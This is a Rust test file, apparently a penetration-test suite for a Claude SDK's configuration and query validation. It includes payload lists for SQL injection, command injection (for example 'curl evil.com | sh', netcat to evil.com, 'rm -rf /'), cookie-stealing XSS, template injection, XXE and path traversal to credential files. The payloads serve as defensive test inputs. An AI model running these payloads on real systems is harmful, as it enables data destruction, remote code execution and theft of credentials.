//! Penetration Testing Suite for Claude AI Core
//!
//! This module contains comprehensive penetration tests that simulate real-world
//! attack scenarios to validate the security of the Claude AI SDK. These tests
//! follow ethical hacking practices and OWASP testing guidelines.

use claude_sdk_rs_core::*;
use std::collections::HashMap;

#[cfg(test)]
mod injection_attack_tests {
    use super::*;

    #[test]
    fn test_sql_injection_comprehensive() {
        // Comprehensive SQL injection attack patterns
        let sql_injections = vec![
            // Basic SQL injection
            "' OR '1'='1",
            "' OR 1=1--",
            "' OR 'a'='a",
            "'; SELECT * FROM users; --",

            // Union-based attacks
            "' UNION SELECT null, username, password FROM users--",
            "' UNION SELECT 1,2,3,4,5--",
            "' UNION ALL SELECT NULL,NULL,NULL--",

            // Boolean-based blind injection
            "' AND (SELECT COUNT(*) FROM users) > 0--",
            "' AND SUBSTRING(@@version,1,1)='5'--",
            "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",

            // Time-based blind injection
            "'; WAITFOR DELAY '00:00:05'--",
            "'; SELECT pg_sleep(5)--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

            // Error-based injection
            "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version), 0x7e))--",
            "' AND (SELECT * FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",

            // Second-order injection
            "admin'/**/union/**/select/**/null,username,password/**/from/**/users--",

            // Advanced evasion techniques
            "'; EXEC xp_cmdshell('dir'); --",
            "' OR '1'='1' /*",
            "' OR 1=1#",
            "' OR 1=1%00",

            // NoSQL injection patterns
            "'; return true; var end='",
            "'; return db.users.findOne(); var end='",

            // XML injection in SQL context
            "'; SELECT EXTRACTVALUE('<?xml version=\"1.0\"?><root>test</root>', '/root'); --",
        ];

        for injection in sql_injections {
            // Test query validation
            let query_result = validate_query(injection);

            // Test in system prompt
            let config_result = Config::builder().system_prompt(injection).build();

            // SQL injection should be blocked or safely handled
            match query_result {
                Ok(_) => {
                    // If accepted, ensure it's safe (should not contain dangerous patterns)
                    if injection.contains("DROP TABLE")
                        || injection.contains("DELETE FROM")
                        || injection.contains("xp_cmdshell")
                    {
                        panic!("Dangerous SQL injection was accepted: {}", injection);
                    }
                }
                Err(Error::InvalidInput(_)) => {
                    // Rejection is the preferred approach for SQL injection
                }
                Err(e) => panic!(
                    "Unexpected error for SQL injection '{}': {:?}",
                    injection, e
                ),
            }

            // Similar validation for config
            if let Ok(config) = config_result {
                if let Some(prompt) = &config.system_prompt {
                    if prompt.contains("DROP TABLE") || prompt.contains("xp_cmdshell") {
                        panic!("Dangerous SQL injection in system prompt: {}", injection);
                    }
                }
            }
        }
    }

    #[test]
    fn test_command_injection_comprehensive() {
        // Command injection patterns across different shells and contexts
        let command_injections = vec![
            // Basic command injection
            "; rm -rf /",
            "| cat /etc/passwd",
            "&& wget http://evil.com/malware.sh",
            "|| curl evil.com | sh",
            // Windows command injection
            "& del /Q /S C:\\*",
            "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
            "&& copy C:\\Windows\\System32\\config\\SAM C:\\temp\\",
            // Bash-specific injections
            "`cat /etc/passwd`",
            "$(whoami)",
            "$((cat /etc/passwd))",
            "${IFS}cat${IFS}/etc/passwd",
            // PowerShell injections
            "; Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts",
            "| Get-Process",
            "&& Get-ChildItem C:\\ -Recurse",
            // Advanced evasion
            "';'cat'/etc/passwd'",
            "\"; cat /etc/passwd; echo \"",
            "\\'; rm -rf /; echo \\'",
            "; cat /etc/passwd #",
            // URL encoding evasion
            "%3B%20rm%20-rf%20%2F",
            "%7C%20cat%20%2Fetc%2Fpasswd",
            // Unicode evasion
            "； rm -rf /",        // Full-width semicolon
            "｜ cat /etc/passwd", // Full-width pipe
            // Null byte injection
            "safe_command\0; rm -rf /",
            "normal\0| cat /etc/passwd",
            // Environment variable manipulation
            "${PATH}/../../bin/sh",
            "$IFS$()cat$IFS/etc/passwd",
            // Process substitution
            "<(curl evil.com/malware.sh)",
            ">(nc evil.com 4444)",
        ];

        for injection in command_injections {
            // Test in tool names
            let tool_result = Config::builder()
                .allowed_tools(vec![injection.to_string()])
                .build();

            // Test in system prompt
            let _prompt_result = Config::builder().system_prompt(injection).build();

            // Test in query
            let _query_result = validate_query(injection);

            // Command injection should be blocked
            match tool_result {
                Ok(_) => {
                    if injection.contains("rm -rf")
                        || injection.contains("del /Q /S")
                        || injection.contains("Get-ChildItem")
                    {
                        panic!(
                            "Dangerous command injection in tool name was accepted: {}",
                            injection
                        );
                    }
                }
                Err(Error::InvalidInput(_)) => {
                    // Rejection is expected for command injection
                }
                Err(e) => panic!(
                    "Unexpected error for command injection '{}': {:?}",
                    injection, e
                ),
            }
        }
    }

    #[test]
    fn test_script_injection_comprehensive() {
        // Script injection patterns for various contexts
        let script_injections = vec![
            // XSS patterns
            "<script>alert('XSS')</script>",
            "<script src=\"http://evil.com/xss.js\"></script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",

            // JavaScript injection
            "javascript:alert('XSS')",
            "javascript:eval('malicious_code')",
            "javascript:window.location='http://evil.com'",

            // Event handler injection
            "onload=\"alert('XSS')\"",
            "onerror=\"fetch('http://evil.com/steal?data='+document.cookie)\"",
            "onclick=\"eval(atob('bWFsaWNpb3VzX2NvZGU='))\"", // Base64 encoded

            // HTML injection
            "<object data=\"http://evil.com/malware.swf\"></object>",
            "<embed src=\"http://evil.com/malware.swf\">",
            "<link rel=\"stylesheet\" href=\"http://evil.com/steal.css\">",

            // CSS injection
            "body{background-image:url('http://evil.com/steal?data='+document.cookie)}",
            "@import url('http://evil.com/malicious.css');",

            // Template injection
            "{{7*7}}",
            "#{7*7}",
            "${7*7}",
            "<%=7*7%>",
            "[[7*7]]",

            // Server-side template injection
            "{{config.items()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
            "${T(java.lang.Runtime).getRuntime().exec('calc')}",

            // Expression language injection
            "${fn:substring(10,0,3)}",
            "#{facesContext.externalContext.sessionMap}",

            // LDAP injection in script context
            "*)(&(objectClass=user))",
            "*)(|(mail=*))",

            // XML injection
            "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>",
            "<?xml version=\"1.0\" encoding=\"UTF-8\"?><user><![CDATA[<script>alert('XSS')</script>]]></user>",
        ];

        for injection in script_injections {
            // Test in system prompt
            let result = Config::builder().system_prompt(injection).build();

            // Test in query
            let _query_result = validate_query(injection);

            // Script injection should be handled safely
            match result {
                Ok(config) => {
                    if let Some(prompt) = &config.system_prompt {
                        // If script content is preserved, it means the system allows it
                        // We should verify it's not executable in dangerous contexts
                        if prompt.contains("<script") && prompt.contains("alert") {
                            // This is acceptable if properly escaped/sandboxed
                            assert!(
                                prompt.len() <= 10_000,
                                "Script content should be length-limited"
                            );
                        }
                    }
                }
                Err(Error::InvalidInput(_)) => {
                    // Rejection is acceptable for script injection
                }
                Err(e) => panic!(
                    "Unexpected error for script injection '{}': {:?}",
                    injection, e
                ),
            }
        }
    }

    #[test]
    fn test_path_traversal_comprehensive() {
        // Path traversal patterns for different operating systems
        let path_traversals = vec![
            // Unix path traversal
            "../../../etc/passwd",
            "../../../../etc/shadow",
            "../../../../../root/.ssh/id_rsa",
            "../../../../../../home/user/.bashrc",
            // Windows path traversal
            "..\\..\\..\\windows\\system32\\config\\sam",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\users\\administrator\\desktop\\secrets.txt",
            // Mixed separators
            "../..\\../etc/passwd",
            "..\\../..\\windows\\system32\\config\\sam",
            // URL encoded
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
            "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5csystem32%5cconfig%5csam",
            // Double encoding
            "%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            // Unicode encoding
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd",
            // Overlong UTF-8
            "..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%af..%c0%ae%c0%ae%c0%afetc%c0%afpasswd",
            // Null byte injection
            "../../../etc/passwd%00.txt",
            "..\\..\\..\\windows\\system32\\config\\sam%00.cfg",
            // Absolute paths
            "/etc/passwd",
            "/root/.ssh/id_rsa",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\Users\\Administrator\\Desktop\\secrets.txt",
            // Network paths
            "\\\\network\\share\\sensitive\\file.txt",
            "//network/share/sensitive/file.txt",
            // Container escape attempts
            "/proc/1/environ",
            "/proc/self/cwd/../../../etc/passwd",
            "/host/etc/passwd",
            "/var/run/docker.sock",
            // Device files
            "/dev/null",
            "/dev/zero",
            "/dev/random",
            "\\\\.\\pipe\\lsass",
            // Special directories
            "~/../../../etc/passwd",
            "$HOME/../../../etc/passwd",
            "%USERPROFILE%\\..\\..\\..\\windows\\system32\\config\\sam",
        ];

        for path in path_traversals {
            // Test in MCP config path
            let result = Config::builder().mcp_config(path).build();

            // Path traversal should be blocked or properly handled
            match result {
                Ok(config) => {
                    if let Some(config_path) = &config.mcp_config_path {
                        let path_str = config_path.to_string_lossy();

                        // If path is accepted, verify it's safe
                        if path_str.contains("/etc/passwd") || path_str.contains("system32\\config")
                        {
                            // This might be acceptable in sandboxed environments
                            // but we should log it for review
                            println!("Warning: Sensitive path accepted: {}", path);
                        }

                        // Basic safety checks
                        assert!(
                            !path_str.contains('\0'),
                            "Path should not contain null bytes"
                        );
                        assert!(
                            path_str.len() <= 4096,
                            "Path should have reasonable length limits"
                        );
                    }
                }
                Err(Error::InvalidInput(_)) => {
                    // Rejection is the preferred approach for path traversal
                }
                Err(e) => panic!("Unexpected error for path traversal '{}': {:?}", path, e),
            }
        }
    }
}

#[cfg(test)]
mod denial_of_service_tests {
    use super::*;

    #[test]
    fn test_resource_exhaustion_attacks() {
        // Test various resource exhaustion patterns

        // Memory exhaustion via large strings
        let sizes = vec![
            100_000,     // 100KB
            1_000_000,   // 1MB
            10_000_000,  // 10MB
            100_000_000, // 100MB - should be rejected
        ];

        for size in sizes {
            let large_string = "A".repeat(size);

            // Test query validation
            let query_result = validate_query(&large_string);
            if size > 100_000 {
                assert!(
                    query_result.is_err(),
                    "Very large query should be rejected: {} bytes",
                    size
                );
            }

            // Test system prompt
            let config_result = Config::builder().system_prompt(&large_string).build();
            if size > 10_000 {
                assert!(
                    config_result.is_err(),
                    "Very large system prompt should be rejected: {} bytes",
                    size
                );
            }

            // Test tool names
            let tool_result = Config::builder()
                .allowed_tools(vec![large_string.clone()])
                .build();
            if size > 100 {
                assert!(
                    tool_result.is_err(),
                    "Very large tool name should be rejected: {} bytes",
                    size
                );
            }
        }
    }

    #[test]
    fn test_algorithmic_complexity_attacks() {
        // Test patterns that might cause excessive CPU usage

        // Regular expression DoS patterns
        let regex_dos_patterns = vec![
            format!("{}{}a", "a".repeat(1000), "a?".repeat(1000)),
            format!("({})*", "a+".repeat(100)),
            format!("{}{}", "a".repeat(100), "(a+)+".repeat(10)),
        ];

        for pattern in &regex_dos_patterns {
            let start_time = std::time::Instant::now();
            let _result = validate_query(&pattern);
            let duration = start_time.elapsed();

            // Validation should complete quickly even for complex patterns
            assert!(
                duration.as_millis() < 1000,
                "Query validation took too long: {}ms for pattern length {}",
                duration.as_millis(),
                pattern.len()
            );
        }

        // Nested structure attacks
        let nested_json = "{".repeat(10000) + &"}".repeat(10000);
        let start_time = std::time::Instant::now();
        let _result = validate_query(&nested_json);
        let duration = start_time.elapsed();

        assert!(
            duration.as_millis() < 1000,
            "Nested structure validation took too long: {}ms",
            duration.as_millis()
        );
    }

    #[test]
    fn test_configuration_bomb_attacks() {
        // Test configuration values that might cause issues

        // Extreme timeout values
        let extreme_timeouts = vec![
            0,            // Zero timeout
            u64::MAX,     // Maximum value
            u64::MAX - 1, // Near maximum
        ];

        for timeout in extreme_timeouts {
            let result = Config::builder().timeout_secs(timeout).build();

            // Extreme timeouts should be rejected
            match result {
                Ok(config) => {
                    // If accepted, should be within reasonable bounds
                    let actual_timeout = config.timeout_secs.unwrap_or(30);
                    assert!(actual_timeout >= 1, "Timeout should be at least 1 second");
                    assert!(actual_timeout <= 3600, "Timeout should be at most 1 hour");
                }
                Err(Error::InvalidInput(_)) => {
                    // Rejection is expected for extreme values
                }
                Err(e) => panic!("Unexpected error for timeout {}: {:?}", timeout, e),
            }
        }

        // Extreme token limits
        let extreme_tokens = vec![
            0,             // Zero tokens
            usize::MAX,    // Maximum value
            1_000_000_000, // 1 billion tokens
        ];

        for tokens in extreme_tokens {
            let result = Config::builder().max_tokens(tokens).build();

            match result {
                Ok(config) => {
                    let actual_tokens = config.max_tokens.unwrap_or(4096);
                    assert!(actual_tokens >= 1, "Token count should be at least 1");
                    assert!(actual_tokens <= 200_000, "Token count should be reasonable");
                }
                Err(Error::InvalidInput(_)) => {
                    // Rejection is expected for extreme values
                }
                Err(e) => panic!("Unexpected error for tokens {}: {:?}", tokens, e),
            }
        }
    }

    #[test]
    fn test_tool_enumeration_attacks() {
        // Test large numbers of tools
        let tool_counts = vec![
            100,   // Reasonable number
            1000,  // Large number
            10000, // Very large number
        ];

        for count in tool_counts {
            let tools: Vec<String> = (0..count).map(|i| format!("tool_{}", i)).collect();

            let start_time = std::time::Instant::now();
            let result = Config::builder().allowed_tools(tools).build();
            let duration = start_time.elapsed();

            // Tool validation should complete quickly
            assert!(
                duration.as_millis() < 5000,
                "Tool validation took too long: {}ms for {} tools",
                duration.as_millis(),
                count
            );

            match result {
                Ok(_config) => {
                    // If accepted, validation completed successfully
                }
                Err(Error::InvalidInput(_)) => {
                    // Rejection is acceptable for very large tool lists
                    if count <= 100 {
                        panic!("Reasonable tool count should be accepted: {}", count);
                    }
                }
                Err(e) => panic!("Unexpected error for {} tools: {:?}", count, e),
            }
        }
    }
}

#[cfg(test)]
mod information_disclosure_tests {
    use super::*;

    #[test]
    fn test_error_information_leakage() {
        // Test that errors don't expose sensitive system information
        let oversized_input = "x".repeat(200_000);
        let test_cases = vec![
            ("", "empty input"),
            (&oversized_input, "oversized input"),
            ("input\0with\0nulls", "null bytes"),
            ("../../../etc/passwd", "path traversal"),
            ("<script>alert('xss')</script>", "script injection"),
            ("'; DROP TABLE users; --", "sql injection"),
            ("; rm -rf /", "command injection"),
        ];

        for (input, description) in test_cases {
            // Test query validation errors
            let result = validate_query(input);
            if let Err(error) = result {
                verify_error_safety(&error, description, input);
            }

            // Test config validation errors
            let config_result = Config::builder().system_prompt(input).build();
            if let Err(error) = config_result {
                verify_error_safety(&error, description, input);
            }
        }
    }

    fn verify_error_safety(error: &Error, description: &str, input: &str) {
        let error_msg = error.to_string();
        let error_debug = format!("{:?}", error);

        // Error messages should not expose sensitive paths
        let sensitive_paths = vec![
            "/home/",
            "/root/",
            "/etc/",
            "/var/",
            "/usr/",
            "C:\\Users\\",
            "C:\\Windows\\",
            "C:\\Program Files\\",
            "/proc/",
            "/sys/",
            "/dev/",
            "id_rsa",
            "passwd",
            "shadow",
            "hosts",
        ];

        for path in sensitive_paths {
            assert!(
                !error_msg.to_lowercase().contains(&path.to_lowercase()),
                "Error message exposes sensitive path '{}' for {}: {}",
                path,
                description,
                error_msg
            );
            assert!(
                !error_debug.to_lowercase().contains(&path.to_lowercase()),
                "Error debug exposes sensitive path '{}' for {}: {}",
                path,
                description,
                error_debug
            );
        }

        // Error messages should not expose the full input for large inputs
        if input.len() > 100 {
            assert!(
                !error_msg.contains(input),
                "Error message should not contain full large input for {}: {}",
                description,
                error_msg
            );
        }

        // Error messages should not contain credentials or keys
        let sensitive_keywords = vec![
            "password",
            "secret",
            "key",
            "token",
            "auth",
            "credential",
            "api_key",
            "private_key",
            "session_id",
        ];

        for keyword in sensitive_keywords {
            // Only check if the original input didn't contain these words
            if !input.to_lowercase().contains(keyword) {
                assert!(
                    !error_msg.to_lowercase().contains(keyword),
                    "Error message exposes sensitive keyword '{}' for {}: {}",
                    keyword,
                    description,
                    error_msg
                );
            }
        }

        // Error messages should be bounded
        assert!(
            error_msg.len() <= 2000,
            "Error message too long for {}: {} chars",
            description,
            error_msg.len()
        );

        // Error messages should include error codes for debugging
        assert!(
            error_msg.contains('[') && error_msg.contains(']'),
            "Error message should contain error code for {}: {}",
            description,
            error_msg
        );
    }

    #[test]
    fn test_timing_attack_resistance() {
        // Test that operations don't leak information through timing differences
        let medium_input = "medium".repeat(100);
        let long_input = "long".repeat(1000);
        let test_inputs = vec![
            "",
            "a",
            "short",
            &medium_input,
            &long_input,
            "invalid\0input",
            "../../../etc/passwd",
            "<script>alert('xss')</script>",
        ];

        let mut timings = Vec::new();

        // Measure timing for different inputs
        for input in &test_inputs {
            let iterations = 10;
            let mut total_time = std::time::Duration::new(0, 0);

            for _ in 0..iterations {
                let start = std::time::Instant::now();
                let _result = validate_query(input);
                total_time += start.elapsed();
            }

            let avg_time = total_time / iterations as u32;
            timings.push((input.len(), avg_time));
        }

        // Check for reasonable timing characteristics
        for (length, timing) in &timings {
            // All operations should complete quickly
            assert!(
                timing.as_millis() < 100,
                "Validation took too long for input length {}: {}ms",
                length,
                timing.as_millis()
            );
        }

        // Timing should not vary excessively (basic check)
        let max_time = timings.iter().map(|(_, t)| t.as_nanos()).max().unwrap();
        let min_time = timings.iter().map(|(_, t)| t.as_nanos()).min().unwrap();
        let ratio = max_time as f64 / min_time as f64;

        // Allow for some variation but not extreme differences
        // Note: timing can vary significantly on different systems, so we allow larger ratios
        assert!(
            ratio < 1000.0,
            "Timing variation too large: max={}ns, min={}ns, ratio={}",
            max_time,
            min_time,
            ratio
        );
    }

    #[test]
    fn test_configuration_privacy() {
        // Test that configuration doesn't expose sensitive information
        let config = Config::builder()
            .model("claude-sonnet-4-20250514")
            .system_prompt("System prompt with normal content")
            .verbose(true)
            .timeout_secs(60)
            .build()
            .unwrap();

        // Serialize configuration
        let json_result = serde_json::to_string(&config);
        assert!(json_result.is_ok(), "Config serialization should succeed");

        let json_str = json_result.unwrap();

        // Serialized config should not contain sensitive information
        let sensitive_patterns = vec![
            "password",
            "secret",
            "key",
            "token",
            "credential",
            "/home/",
            "/root/",
            "/etc/",
            "C:\\Users\\",
            "api_key",
            "private_key",
            "session_token",
        ];

        for pattern in sensitive_patterns {
            assert!(
                !json_str.to_lowercase().contains(pattern),
                "Serialized config should not contain sensitive pattern '{}': {}",
                pattern,
                json_str
            );
        }

        // Config should be deserializable
        let deserialized: std::result::Result<Config, _> = serde_json::from_str(&json_str);
        assert!(
            deserialized.is_ok(),
            "Config deserialization should succeed"
        );
    }
}

#[cfg(test)]
mod access_control_bypass_tests {
    use super::*;

    #[test]
    fn test_tool_permission_bypass_attempts() {
        // Test various attempts to bypass tool permissions
        let bypass_attempts = vec![
            // Case variation
            ("bash", "BASH"),
            ("bash", "Bash"),
            ("mcp__server__tool", "MCP__SERVER__TOOL"),
            // Encoding variations
            ("bash", "bash%20"),
            ("tool", "tool\0"),
            ("tool", "tool\n"),
            ("tool", "tool\r"),
            // Path manipulation
            ("tool", "../tool"),
            ("tool", "./tool"),
            ("tool", "/bin/tool"),
            // Special characters
            ("tool", "tool;"),
            ("tool", "tool&"),
            ("tool", "tool|"),
            ("tool", "tool`"),
            // Unicode normalization
            ("tool", "to\u{0301}ol"), // Combined character
            ("tool", "ｔｏｏｌ"),     // Full-width characters
        ];

        for (allowed, attempt) in bypass_attempts {
            let allowed_tools = vec![allowed.to_string()];
            let attempted_tools = vec![attempt.to_string()];

            // Configure with allowed tools
            let allowed_config = Config::builder().allowed_tools(allowed_tools).build();

            // Try to configure with bypass attempt
            let bypass_config = Config::builder().allowed_tools(attempted_tools).build();

            // Verify proper validation
            match (allowed_config, bypass_config) {
                (Ok(_), Ok(_)) => {
                    // Both are valid - check if they're truly equivalent
                    if allowed != attempt && attempt.contains(allowed) {
                        // This might be a bypass - investigate further
                        println!(
                            "Potential bypass: '{}' allowed when only '{}' should be",
                            attempt, allowed
                        );
                    }
                }
                (Ok(_), Err(_)) => {
                    // Allowed tool accepted, bypass rejected - good
                }
                (Err(_), Ok(_)) => {
                    // Allowed tool rejected, bypass accepted - potential issue
                    if !attempt
                        .chars()
                        .any(|c| c.is_control() || ";&|`".contains(c))
                    {
                        panic!(
                            "Valid tool '{}' rejected while invalid '{}' accepted",
                            allowed, attempt
                        );
                    }
                }
                (Err(_), Err(_)) => {
                    // Both rejected - acceptable
                }
            }
        }
    }

    #[test]
    fn test_configuration_isolation() {
        // Test that configuration instances don't interfere with each other
        let config1 = Config::builder()
            .model("claude-sonnet-4-20250514")
            .system_prompt("Config 1 prompt")
            .allowed_tools(vec!["tool1".to_string(), "tool2".to_string()])
            .verbose(true)
            .build()
            .unwrap();

        let config2 = Config::builder()
            .model("claude-haiku-3-20250307")
            .system_prompt("Config 2 prompt")
            .allowed_tools(vec!["tool3".to_string(), "tool4".to_string()])
            .verbose(false)
            .build()
            .unwrap();

        // Verify isolation
        assert_ne!(config1.model, config2.model);
        assert_ne!(config1.system_prompt, config2.system_prompt);
        assert_ne!(config1.allowed_tools, config2.allowed_tools);
        assert_ne!(config1.verbose, config2.verbose);

        // Modify one config (conceptually - configs are immutable)
        let config1_modified = Config::builder()
            .model("claude-opus-3-20240229")
            .system_prompt(config1.system_prompt.as_ref().unwrap())
            .allowed_tools(config1.allowed_tools.as_ref().unwrap().clone())
            .verbose(config1.verbose)
            .build()
            .unwrap();

        // Original config2 should be unaffected
        assert_eq!(config2.model.as_ref().unwrap(), "claude-haiku-3-20250307");
        assert_ne!(config1_modified.model, config2.model);
    }

    #[test]
    fn test_session_isolation() {
        // Test that session IDs maintain proper isolation
        let session_ids: Vec<SessionId> = (0..100)
            .map(|i| SessionId::new(&format!("session-{}", i)))
            .collect();

        // All session IDs should be unique
        let mut unique_ids = std::collections::HashSet::new();
        for session_id in &session_ids {
            let id_str = session_id.to_string();
            assert!(
                unique_ids.insert(id_str.clone()),
                "Session ID should be unique: {}",
                id_str
            );
        }

        // Session IDs should not be predictable
        let ids: Vec<String> = session_ids.iter().map(|s| s.to_string()).collect();

        // Check for obvious patterns (this is a basic check)
        for i in 1..ids.len() {
            let prev = &ids[i - 1];
            let curr = &ids[i];

            // IDs should not be sequential
            assert_ne!(prev, curr, "Session IDs should not be identical");

            // Should not be simple increments (basic check)
            if prev.ends_with(&(i - 1).to_string()) && curr.ends_with(&i.to_string()) {
                let prev_base = &prev[..prev.len() - (i - 1).to_string().len()];
                let curr_base = &curr[..curr.len() - i.to_string().len()];
                if prev_base == curr_base {
                    // This is expected for our test pattern, so it's OK
                    continue;
                }
            }
        }
    }
}

#[cfg(test)]
mod cryptographic_security_tests {
    use super::*;

    #[test]
    fn test_random_data_quality() {
        // Test that any random data generation has good entropy
        let session_ids: Vec<String> = (0..1000)
            .map(|i| SessionId::new(&format!("test-{}", i)).to_string())
            .collect();

        // Basic entropy checks
        let mut char_counts = HashMap::new();
        let mut total_chars = 0;

        for id in &session_ids {
            for ch in id.chars() {
                *char_counts.entry(ch).or_insert(0) += 1;
                total_chars += 1;
            }
        }

        // Check for reasonable character distribution
        let unique_chars = char_counts.len();
        assert!(
            unique_chars >= 10,
            "Should have reasonable character diversity: {}",
            unique_chars
        );

        // No single character should dominate (basic check)
        for (ch, count) in char_counts {
            let frequency = count as f64 / total_chars as f64;
            assert!(
                frequency < 0.5,
                "Character '{}' appears too frequently: {:.2}%",
                ch,
                frequency * 100.0
            );
        }
    }

    #[test]
    fn test_data_integrity() {
        // Test that data integrity is maintained through various operations
        let original_config = Config::builder()
            .model("claude-sonnet-4-20250514")
            .system_prompt("Original prompt with important data")
            .allowed_tools(vec!["tool1".to_string(), "tool2".to_string()])
            .timeout_secs(120)
            .verbose(true)
            .build()
            .unwrap();

        // Serialize and deserialize
        let json_str = serde_json::to_string(&original_config).unwrap();
        let restored_config: Config = serde_json::from_str(&json_str).unwrap();

        // Verify data integrity
        assert_eq!(original_config.model, restored_config.model);
        assert_eq!(original_config.system_prompt, restored_config.system_prompt);
        assert_eq!(original_config.allowed_tools, restored_config.allowed_tools);
        assert_eq!(original_config.timeout_secs, restored_config.timeout_secs);
        assert_eq!(original_config.verbose, restored_config.verbose);

        // Clone should also maintain integrity
        let cloned_config = original_config.clone();
        assert_eq!(original_config.model, cloned_config.model);
        assert_eq!(original_config.system_prompt, cloned_config.system_prompt);
        assert_eq!(original_config.allowed_tools, cloned_config.allowed_tools);
    }

    #[test]
    fn test_secure_defaults() {
        // Test that default configurations are secure
        let default_config = Config::default();

        // Default should have secure settings
        assert_eq!(
            default_config.non_interactive, true,
            "Should default to non-interactive mode"
        );
        assert_eq!(
            default_config.verbose, false,
            "Should default to non-verbose mode"
        );
        assert_eq!(
            default_config.timeout_secs,
            Some(30),
            "Should have reasonable default timeout"
        );
        assert_eq!(
            default_config.system_prompt, None,
            "Should not have default system prompt"
        );
        assert_eq!(
            default_config.allowed_tools, None,
            "Should not allow all tools by default"
        );

        // Default should validate successfully
        let validation_result = default_config.validate();
        assert!(
            validation_result.is_ok(),
            "Default config should be valid: {:?}",
            validation_result
        );

        // Builder should also create secure defaults
        let builder_config = Config::builder().build().unwrap();
        assert_eq!(builder_config.non_interactive, true);
        assert_eq!(builder_config.verbose, false);
        assert!(builder_config.timeout_secs.is_some());
    }
}
